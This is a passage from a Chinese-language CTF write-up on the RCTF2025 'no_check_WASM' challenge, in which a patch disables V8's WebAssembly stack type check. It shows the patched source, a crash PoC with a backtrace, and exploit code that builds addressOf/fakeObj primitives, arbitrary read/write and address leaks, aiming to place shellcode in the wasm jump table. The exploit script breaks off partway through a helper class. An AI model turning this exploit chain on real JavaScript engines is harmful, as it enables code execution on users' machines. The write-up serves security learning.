&#123;</span><br><span class="line">    if (stack_.back().type == merge-&gt;vals.first.type) return true;</span><br><span class="line">  &#125;</span><br><span class="line">  return TypeCheckStackAgainstMerge_Slow&lt;strict_count, push_branch_values,</span><br><span class="line">                                         merge_type, rewrite_types&gt;(merge);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Slow path for &#123;TypeCheckStackAgainstMerge&#125;.</span><br><span class="line">template &lt;StackElementsCountMode strict_count,</span><br><span class="line">          PushBranchValues push_branch_values, MergeType merge_type,</span><br><span class="line">          RewriteStackTypes rewrite_types&gt;</span><br><span class="line">V8_PRESERVE_MOST V8_NOINLINE bool TypeCheckStackAgainstMerge_Slow(</span><br><span class="line">    Merge&lt;Value&gt;* merge) &#123;</span><br><span class="line">  constexpr const char* merge_description =</span><br><span class="line">      merge_type == kBranchMerge     ? &quot;branch&quot;</span><br><span class="line">      : merge_type == kReturnMerge   ? &quot;return&quot;</span><br><span class="line">      : merge_type == kInitExprMerge ? &quot;constant expression&quot;</span><br><span class="line">                                     : &quot;fallthru&quot;;</span><br><span class="line">  uint32_t arity = merge-&gt;arity;</span><br><span class="line">  uint32_t actual = stack_.size() - control_.back().stack_depth;</span><br><span class="line">  // Here we have to check for !unreachable(), because we need to typecheck as</span><br><span class="line">  // if the current code is reachable even if it is spec-only reachable.</span><br><span class="line">  if (V8_LIKELY(decoding_mode == kConstantExpression ||</span><br><span class="line">                !control_.back().unreachable())) &#123;</span><br><span class="line">    // if (V8_UNLIKELY(strict_count ? actual != arity : actual &lt; arity)) &#123;</span><br><span class="line">    //   this-&gt;DecodeError(&quot;expected %u elements on the stack for %s, found %u&quot;,</span><br><span class="line">    //                     arity, merge_description, actual);</span><br><span class="line">    //   return false;</span><br><span class="line">    // &#125;</span><br><span class="line">    // // Typecheck the topmost &#123;merge-&gt;arity&#125; values on the stack.</span><br><span class="line">    // Value* stack_values = stack_.end() - arity;</span><br><span class="line">    // for (uint32_t i = 0; i &lt; arity; ++i) &#123;</span><br><span class="line">    //   Value&amp; val = stack_values[i];</span><br><span class="line">    //   Value&amp; old = (*merge)[i];</span><br><span class="line">    //   if (!IsSubtypeOf(val.type, old.type, this-&gt;module_)) &#123;</span><br><span class="line">    //     this-&gt;DecodeError(&quot;type error in %s[%u] (expected %s, got %s)&quot;,</span><br><span class="line">    //                       merge_description, i, old.type.name().c_str(),</span><br><span class="line">    //                       val.type.name().c_str());</span><br><span class="line">    //     return false;</span><br><span class="line">    //   &#125;</span><br><span class="line">    //   if constexpr (static_cast&lt;bool&gt;(rewrite_types)) &#123;</span><br><span class="line">    //     // Upcast type on the stack to the target type of the label.</span><br><span class="line">    //     val.type = old.type;</span><br><span class="line">    //   &#125;</span><br><span class="line">    // &#125;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>不难发现patch的内容在 <code>TypeCheckStackAgainstMerge_Slow</code> 中，通过名字判断这应该是个慢速路径，<code>TypeCheckStackAgainstMerge_Slow</code> 又被<code>TypeCheckStackAgainstMerge</code>  调用，分析到这一步已经够用了，笔者就不接着往上分析了，现在来分析一下<code>TypeCheckStackAgainstMerge</code>  怎么才能走到<code>TypeCheckStackAgainstMerge_Slow</code> 的路径中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">V8_INLINE bool TypeCheckStackAgainstMerge(Merge&lt;Value&gt;* merge) &#123;</span><br><span class="line">   uint32_t arity = merge-&gt;arity;</span><br><span class="line">   uint32_t actual = stack_.size() - control_.back().stack_depth;</span><br><span class="line">   // Handle trivial cases first. Arity 0 is the most common case.</span><br><span class="line">   if (arity == 0 &amp;&amp; (!strict_count || actual == 0)) return true;</span><br><span class="line">   // Arity 1 is still common enough that we handle it separately (only doing</span><br><span class="line">   // the most basic subtype check).</span><br><span class="line">   if (arity == 1 &amp;&amp; (strict_count ? actual == arity : actual &gt;= arity)) &#123;</span><br><span class="line">     if (stack_.back().type == merge-&gt;vals.first.type) return true;</span><br><span class="line">   &#125;</span><br><span class="line">   return TypeCheckStackAgainstMerge_Slow&lt;strict_count, push_branch_values,</span><br><span class="line">                                          merge_type, rewrite_types&gt;(merge);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>不难发现栈上的实际值数量与合并点期望接收的值数量不一致会进入慢速路径中，下面我们写一个poc来验证一下</p>
<p>这个poc添加了一个一个叫poc的wasm函数，不接受任何参数，并承诺返回三个<code>i32</code>类型的参数，但我们这个函数是个空函数</p>
<p>栈上一个值也不会有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">path = &quot;../v8/test/mjsunit/wasm/wasm-module-builder.js&quot;;</span><br><span class="line">d8.file.execute(path);</span><br><span class="line"></span><br><span class="line">const builder = new WasmModuleBuilder();</span><br><span class="line">builder.addFunction(&quot;poc&quot;, makeSig([], [kWasmI32,kWasmI32,kWasmI32]))</span><br><span class="line">  .exportFunc()</span><br><span class="line">  .addBody([</span><br><span class="line">  ]);</span><br><span class="line"> </span><br><span class="line">const instance = builder.instantiate();</span><br><span class="line">let &#123;poc&#125; = instance.exports;</span><br><span class="line">poc();</span><br></pre></td></tr></table></figure>

<p>直接运行会报错，报的错不是参数校验不对，而是V8的Liftoff编译器在尝试处理返回值时出现问题，因为函数声称返回3个值但实际栈上没有任何值，我们通过栈回溯也可以看到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bt</span><br><span class="line">#0  v8::internal::wasm::LiftoffAssembler::SpillRegister (this=0x7ffcd15f3d48, reg=reg@entry=...) at ../../src/wasm/baseline/liftoff-assembler.cc:1171</span><br><span class="line">#1  0x000055bfc254f538 in v8::internal::wasm::LiftoffAssembler::SpillOneRegister (this=0x7ffcd15f3d48, candidates=candidates@entry=...)</span><br><span class="line">    at ../../src/wasm/baseline/liftoff-assembler.cc:1115</span><br><span class="line">#2  0x000055bfc254bad5 in v8::internal::wasm::LiftoffAssembler::GetUnusedRegister (this=0x7ffcd15f3d48, candidates=...)</span><br><span class="line">    at ../../src/wasm/baseline/liftoff-assembler.h:552</span><br><span class="line">#3  v8::internal::wasm::LiftoffAssembler::GetUnusedRegister (this=0x7ffcd15f3d48, pinned=..., rc=&lt;optimized out&gt;)</span><br><span class="line">    at ../../src/wasm/baseline/liftoff-assembler.h:542</span><br><span class="line">#4  v8::internal::wasm::LiftoffAssembler::LoadToRegister_Slow (this=this@entry=0x7ffcd15f3d48, slot=..., pinned=pinned@entry=...)</span><br><span class="line">    at ../../src/wasm/baseline/liftoff-assembler.cc:380</span><br><span class="line">#5  0x000055bfc254ef17 in v8::internal::wasm::LiftoffAssembler::LoadToRegister (this=0x7ffcd15f3d48, slot=..., pinned=...)</span><br><span class="line">    at ../../src/wasm/baseline/liftoff-assembler.h:396</span><br><span class="line">#6  v8::internal::wasm::LiftoffAssembler::MoveToReturnLocationsMultiReturn (this=0x7ffcd15f3d48, sig=0x1b6c00e8a828, descriptor=0x1b6c00e8f850)</span><br><span class="line">    at ../../src/wasm/baseline/liftoff-assembler.cc:1015</span><br><span class="line">#7  0x000055bfc254eadd in v8::internal::wasm::LiftoffAssembler::MoveToReturnLocations (this=0x7ffcd15f3d48, sig=0x1b6c00e8a828, descriptor=0x1b6c00e8f850)</span><br><span class="line">    at ../../src/wasm/baseline/liftoff-assembler.cc:950</span><br><span class="line">#8  0x000055bfc2577036 in v8::internal::wasm::(anonymous namespace)::LiftoffCompiler::ReturnImpl (this=this@entry=0x7ffcd15f3d48,</span><br><span class="line">    decoder=decoder@entry=0x7ffcd15f3cb0) at ../../src/wasm/baseline/liftoff-compiler.cc:3087</span><br><span class="line">#9  0x000055bfc255c8fe in v8::internal::wasm::(anonymous namespace)::LiftoffCompiler::DoReturn (this=0x7ffcd15f3d48, decoder=0x7ffcd15f3cb0)</span><br><span class="line">    at ../../src/wasm/baseline/liftoff-compiler.cc:3067</span><br><span class="line">#10 v8::internal::wasm::WasmFullDecoder&lt;v8::internal::wasm::Decoder::NoValidationTag, v8::internal::wasm::(anonymous namespace)::LiftoffCompiler, (v8::internal::wasm::DecodingMode)0&gt;::DoReturn&lt;(v8::internal::wasm::WasmFullDecoder&lt;v8::internal::wasm::Decoder::NoValidationTag, v8::internal::wasm::(anonymous namespace)::LiftoffCompiler, (v8::internal::wasm::DecodingMode)0&gt;::StackElementsCountMode)1, (v8::internal::wasm::WasmFullDecoder&lt;v8::internal::wasm::Decoder::NoValidationTag, v8::internal::wasm::(anonymous namespace)::LiftoffCompiler, (v8::internal::wasm::DecodingMode)0&gt;::MergeType)2&gt; (this=0x7ffcd15f3cb0)</span><br><span class="line">    at ../../src/wasm/function-body-decoder-impl.h:7943</span><br><span class="line">#11 v8::internal::wasm::WasmFullDecoder&lt;v8::internal::wasm::Decoder::NoValidationTag, v8::internal::wasm::(anonymous namespace)::LiftoffCompiler, (v8::internal::wasm::DecodingMode)0&gt;::DecodeEndImpl (this=0x7ffcd15f3cb0, trace_msg=&lt;optimized out&gt;, opcode=&lt;optimized out&gt;)</span><br><span class="line">    at ../../src/wasm/function-body-decoder-impl.h:4036</span><br><span class="line">#12 v8::internal::wasm::WasmFullDecoder&lt;v8::internal::wasm::Decoder::NoValidationTag, v8::internal::wasm::(anonymous namespace)::LiftoffCompiler, (v8::internal::wasm::DecodingMode)0&gt;::DecodeEnd (decoder=0x7ffcd15f3cb0, opcode=&lt;optimized out&gt;) at ../../src/wasm/function-body-decoder-impl.h:3943</span><br><span class="line">#13 0x000055bfc2553b7b in v8::internal::wasm::WasmFullDecoder&lt;v8::internal::wasm::Decoder::NoValidationTag, v8::internal::wasm::(anonymous namespace)::LiftoffCompiler, (v8::internal::wasm::DecodingMode)0&gt;::DecodeFunctionBody (this=0x7ffcd15f3cb0) at ../../src/wasm/function-body-decoder-impl.h:3287</span><br><span class="line">#14 v8::internal::wasm::WasmFullDecoder&lt;v8::internal::wasm::Decoder::NoValidationTag, v8::internal::wasm::(anonymous namespace)::LiftoffCompiler, (v8::internal::wasm::DecodingMode)0&gt;::Decode (this=this@entry=0x7ffcd15f3cb0) at ../../src/wasm/function-body-decoder-impl.h:3110</span><br><span class="line">#15 0x000055bfc255244c in v8::internal::wasm::ExecuteLiftoffCompilation (env=env@entry=0x7ffcd15f4538, func_body=..., compiler_options=...)</span><br><span class="line">    at ../../src/wasm/baseline/liftoff-compiler.cc:10823</span><br><span class="line">#16 0x000055bfc25db9fb in v8::internal::wasm::WasmCompilationUnit::ExecuteCompilation (this=0x7ffcd15f45b0, env=0x7ffcd15f4538,</span><br><span class="line">    wire_bytes_storage=0x1b6c00024918, counter_updates=0x1b6c000145c0, detected=0x7ffcd15f45a8) at ../../src/wasm/function-compiler.cc:110</span><br><span class="line">#17 0x000055bfc25df4f8 in v8::internal::wasm::CompileLazy (isolate=isolate@entry=0x1b6c00188000, native_module=native_module@entry=0x1b6c00014400,</span><br><span class="line">    func_index=func_index@entry=0) at ../../src/wasm/module-compiler.cc:1165</span><br><span class="line">#18 0x000055bfc253207a in v8::internal::__RT_impl_Runtime_WasmCompileLazy (args=..., isolate=0x1b6c00188000) at ../../src/runtime/runtime-wasm.cc:401</span><br><span class="line">#19 v8::internal::Runtime_WasmCompileLazy (args_length=&lt;optimized out&gt;, args_object=&lt;optimized out&gt;, isolate=0x1b6c00188000)</span><br><span class="line">    at ../../src/runtime/runtime-wasm.cc:387</span><br><span class="line">#20 0x000055bfc31aa849 in Builtins_WasmCEntry ()</span><br><span class="line">#21 0x000055bfc31a2d95 in Builtins_WasmCompileLazy ()</span><br><span class="line">#22 0x0000000000000000 in ?? ()</span><br></pre></td></tr></table></figure>

<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>在具体利用之前我们先来熟悉一下WASM的几个数据类型</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i32 int32类型</span><br><span class="line">i64 int64类型</span><br><span class="line">externref 外部引用 用于wasm和javascript的对象交互，但是wasm并不能知道javascript对象具体结构布局</span><br><span class="line">struct 内部结构体 wasm完全知道结构布局</span><br></pre></td></tr></table></figure>

<p>然后我们开始构造<code>addressOf</code>和<code>fakeObj</code>原语，我们可以通过函数返回时的控制流合并进行类型混淆</p>
<h5 id="addressOf"><a href="#addressOf" class="headerlink" title="addressOf"></a>addressOf</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">builder.addFunction(&quot;addressOf&quot;, makeSig([kWasmExternRef], [kWasmI32])) //接受一个externref类型返回一个int32类型</span><br><span class="line">.exportFunc()</span><br><span class="line">.addBody([</span><br><span class="line">  kExprLocalGet, 0,//将第一个参数压入栈中，返回值默认从栈顶开始取</span><br><span class="line">]);               </span><br></pre></td></tr></table></figure>

<h5 id="fakeObj"><a href="#fakeObj" class="headerlink" title="fakeObj"></a>fakeObj</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">builder.addFunction(&quot;fakeObj&quot;, makeSig([kWasmI32], [kWasmExternRef]))</span><br><span class="line">.exportFunc()</span><br><span class="line">.addBody([</span><br><span class="line">    kExprLocalGet, 0,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>

<h5 id="AAR-AAW"><a href="#AAR-AAW" class="headerlink" title="AAR &amp;&amp; AAW"></a>AAR &amp;&amp; AAW</h5><p>这里注意一下AAR和AAW的时候要先把i64通过控制流合并进行类型混淆成struct</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const structType = builder.addStruct([makeField(kWasmI64, true)]);</span><br><span class="line"> </span><br><span class="line">const i2s = builder.addFunction(&quot;i64_to_struct&quot;,makeSig([kWasmI64], [wasmRefType(structType)]))</span><br><span class="line">.addBody([</span><br><span class="line">  kExprLocalGet, 0,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">builder.addFunction(&quot;AAR&quot;, makeSig([kWasmI64], [kWasmI64]))</span><br><span class="line">.exportFunc() </span><br><span class="line">.addBody([</span><br><span class="line">  kExprLocalGet, 0,             //获取第一个参数</span><br><span class="line">  kExprCallFunction, i2s.index, //将第一个参数传入i2s函数</span><br><span class="line">  kGCPrefix, kExprStructGet,    //解引用读取</span><br><span class="line">  ...wasmUnsignedLeb(structType, kMaxVarInt32Size),//指定从哪种结构体读取</span><br><span class="line">  ...wasmUnsignedLeb(0, kMaxVarInt32Size),//0表示读取第一个字段</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">builder.addFunction(&quot;AAW&quot;, makeSig([kWasmI64, kWasmI64], []))</span><br><span class="line">.exportFunc()</span><br><span class="line">.addBody([</span><br><span class="line">  kExprLocalGet, 0,</span><br><span class="line">  kExprCallFunction, i2s.index,</span><br><span class="line">  kExprLocalGet, 1, //获取第二个参数即要写入的数据</span><br><span class="line">  kGCPrefix, kExprStructSet, //解引用写入</span><br><span class="line">  ...wasmUnsignedLeb(structType, kMaxVarInt32Size),</span><br><span class="line">  ...wasmUnsignedLeb(0, kMaxVarInt32Size),</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>

<h5 id="泄露沙箱的基址-wasm-stack"><a href="#泄露沙箱的基址-wasm-stack" class="headerlink" title="泄露沙箱的基址&amp;wasm stack"></a>泄露沙箱的基址&amp;wasm stack</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">builder.addFunction(&quot;leak_cage_base&quot;, makeSig([kWasmExternRef], [kWasmI64]))</span><br><span class="line">.exportFunc()</span><br><span class="line">.addBody([</span><br><span class="line">  kExprLocalGet, 0,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">builder.addFunction(&quot;leak_stack&quot;, makeSig([], [kWasmI64, kWasmI64, kWasmI64]))</span><br><span class="line">.exportFunc()</span><br><span class="line">.addBody([</span><br><span class="line">  kExprI64Const, 0,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>

<h5 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h5><p>实际调试发现泄露出的值与栈偏移处的值并不相等，我的猜测是struct的结构体并不是直接指向第一个字段的应该还有其他结构然后才是字段？所以有偏移。后面看了flyyyy师傅的解释<code>这里泄漏出来的值与栈偏移处的值并不相等，原因应该是当i64被cast成struct的时候，底层的heaptype等字段被修改，因此实际转换成struct进行取值的时候，会略微有偏差（通过以前阅读src/wasm/*的推测，这次并没有通过源码验证）</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">let stack_addr = leak_stack();</span><br><span class="line">for(let i = 0; i &lt; stack_addr.length; i++)&#123;</span><br><span class="line">  hexx(&quot;stack_addr[&quot;+i+&quot;]&quot;, stack_addr[i]);</span><br><span class="line">&#125;</span><br><span class="line">stack_value = stack_addr[0] &lt;&lt; 32n | stack_addr[1];</span><br><span class="line">hexx(&quot;stack_value&quot;, stack_value);</span><br><span class="line"> </span><br><span class="line"> for(let i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">   let test = AAR(stack_value+1n+BigInt(i*0x8));</span><br><span class="line">   hexx(&quot;test&quot;, test);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/12/10/RCTF2025-no_check_WASM/index/image-20251211041049303.png" alt="image-20251211041049303"></p>
<p>然后可以看到泄露出的第一个地址位于jit-code所在的段，调试发现于jump_table的偏移也是固定的(在笔者的机器上是0x2940)的那么我们可以将jump_table本来要跳转的汇编指令部分修改为我们的shellcode(将我们的shellcode覆盖在蓝框的区域问题都不大)</p>
<p><img src="/2025/12/10/RCTF2025-no_check_WASM/index/image-20251211051515193.png" alt="image-20251211051515193"></p>
<p><img src="/2025/12/10/RCTF2025-no_check_WASM/index/image-20251211051730977.png" alt="image-20251211051730977"></p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line">class Helpers &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.buf = new ArrayBuffer(8);</span><br><span class="line">    this.f64 = new Float64Array(this.buf);</span><br><span class="line">    this.f32 = new Float32Array(this.buf);</span><br><span class="line">    this.u32 = new Uint32Array(this.buf);</span><br><span class="line">    this.u64 = new BigUint64Array(this.buf);</span><br><span class="line">    this.i64 = new BigInt64Array(this.buf);</span><br><span class="line"></span><br><span class="line">    this.state = &#123;&#125;;</span><br><span class="line">    this.i = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → uint64</span><br><span class="line">  f2i(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // uint64 → float64</span><br><span class="line">  i2f(x) &#123;</span><br><span class="line">    this.u64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int to hex string</span><br><span class="line">  hex(x) &#123;</span><br><span class="line">    return &quot;0x&quot; + x.toString(16);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to hex string</span><br><span class="line">  f2h(x) &#123;</span><br><span class="line">    return this.hex(this.f2i(x));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to aligned address (clear low 2 bits)</span><br><span class="line">  f2a(x) &#123;</span><br><span class="line">    return this.f2i(x) &gt;&gt; 2n &lt;&lt; 2n;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // address to float (set low bit)</span><br><span class="line">  a2f(x) &#123;</span><br><span class="line">    return this.i2f(x | 1n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → int64 (signed)</span><br><span class="line">  f2is(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.i64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → float64 (signed)</span><br><span class="line">  i2fs(x) &#123;</span><br><span class="line">    this.i64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → low 32-bit</span><br><span class="line">  f2lo(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → high 32-bit</span><br><span class="line">  f2hi(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[1];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // two 32-bit → float64</span><br><span class="line">  i2f64(lo, 